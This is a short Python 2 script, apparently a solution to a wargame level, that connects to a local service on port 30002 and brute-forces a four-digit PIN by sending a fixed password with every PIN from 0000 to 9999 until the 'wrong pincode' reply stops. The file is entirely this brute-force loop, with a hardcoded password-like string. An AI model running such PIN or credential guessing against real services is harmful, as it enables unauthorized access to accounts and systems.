#coding: utf-8
from socket import *
import sys

host = "127.0.0.1"
port = 30002
response =(host, port)
s = socket(AF_INET, SOCK_STREAM)
s.connect(response)

print s.recv(1024)
mtucx = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in range(0, 10):
     for j in range(0, 10):
          for k in range(0, 10):
               for l in range(0, 10):
                    s.send(mtucx+str(i)+str(j)+str(k)+str(l)+'\n')
                    res = s.recv(1024)
                    if "Wrong! Please enter the correct pincode." in res:
                         print "Fuck."
                    else:
                         print "Find"
                         print res
                         s.close()
                         sys.exit()
                         
print "oops."
s.close()
